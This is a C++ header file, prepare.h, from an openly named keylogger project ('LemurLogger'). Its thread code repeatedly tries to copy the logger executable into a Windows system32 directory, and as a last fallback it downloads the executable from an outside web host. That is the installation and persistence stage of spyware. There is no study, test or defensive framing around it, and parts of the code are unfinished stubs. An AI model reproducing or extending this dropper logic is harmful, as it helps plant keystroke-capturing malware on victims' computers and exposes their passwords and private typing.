//
//  prepare.h
//  keylogger
//
//  Created by Arekor on 5/16/2560 BE.
//
//

#ifndef prepare_h
#define prepare_h

#include "IO.h"
#include <windows.h>
#include <tchar.h>
#include <strsafe.h>

#define MAX_Procress 1
#define BUF_SIZE 1024

DWORD WINAPI ThreadCheckFile( LPVOID lpParam );
DWORD WINAPI ThreadCopy( LPVOID lpParam );


typedef struct checkdata {
    bool value;

} checkdata, *Pcheckdata;

DWORD WINAPI ThreadCopy( LPVOID lpParam )
{
    HANDLE hStdout;
    Pcheckdata pDataArray;

    // Make sure there is a console to receive output results.

    hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
    if( hStdout == INVALID_HANDLE_VALUE )
        return 1;

    // Cast the parameter to the correct data type.
    // The pointer is known to be valid because
    // it was checked for NULL before the thread was created.

    pDataArray = (Pcheckdata)lpParam;

    // Print the parameter values using thread-safe functions.
    if (!(pDataArray->value)) {
        //do copy 1
        std::string path = "C:/window/system32/";
        std::string filename = "LemurLogger.exe";
        std::string fullpath = path+filename;
        if(!(IO::copy_w_cmd(path,filename))){
            //do copy 2
            const char* desfile_path = fullpath.c_str();
            if (!(IO::ms_Copyfile(desfile_path))) {
                //do copy 3
                if (!(IO::copy(path,filename))) {
                   //do copy 4

                    std::string url = "www.arekor.co/content/images/LemurLogger.exe";
                    if (!(IO::download_File(url.c_str(),path.c_str()))) {
                        return 1;
                    }
                }
            }
        }else{
            pDataArray->value = true;
            return 0;
        }
    }

    return 1;
}
DWORD WINAPI ThreadCheckFile( LPVOID lpParam )
{
    HANDLE hStdout;
    Pcheckdata pDataArray;

    // Make sure there is a console to receive output results.

    hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
    if( hStdout == INVALID_HANDLE_VALUE )
        return 1;

    // Cast the parameter to the correct data type.
    // The pointer is known to be valid because
    // it was checked for NULL before the thread was created.

    pDataArray = (Pcheckdata)lpParam;

    // Print the parameter values using thread-safe functions.
    //Tu do check file

    return 0;
}

bool start()
{
    Pcheckdata pDataArray[MAX_Procress];
    DWORD   dwThreadIdArray[MAX_Procress];
    HANDLE  hThreadArray[MAX_Procress];

    // Create MAX_Procress worker threads.

    for( int i=0; i<MAX_Procress; i++ )
    {
        // Allocate memory for thread data.

        pDataArray[i] = (Pcheckdata) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                            sizeof(checkdata));

        if( pDataArray[i] == NULL )
        {
            // If the array allocation fails, the system is out of memory
            // so there is no point in trying to print an error message.
            // Just terminate execution.
            return false;
        }

        // Generate unique data for each thread to work with.

        pDataArray[i]->value = false;


        // Create the thread to begin execution on its own.
        if (i == 0) {
            hThreadArray[i] = CreateThread(
                                           NULL,                   // default security attributes
                                           0,                      // use default stack size
                                           ThreadCopy,       // thread function name
                                           pDataArray[i],          // argument to thread function
                                           0,                      // use default creation flags
                                           &dwThreadIdArray[i]);   // returns the thread identifier

        }else{
            hThreadArray[i] = CreateThread(
                                           NULL,                   // default security attributes
                                           0,                      // use default stack size
                                           ThreadCheckFile,       // thread function name
                                           pDataArray[i],          // argument to thread function
                                           0,                      // use default creation flags
                                           &dwThreadIdArray[i]);   // returns the thread identifier

        }


        // Check the return value for success.
        // If CreateThread fails, terminate execution.
        // This will automatically clean up threads and memory.

        if (hThreadArray[i] == NULL)
        {

            return false;
        }
    }
}

#endif /* prepare_h */
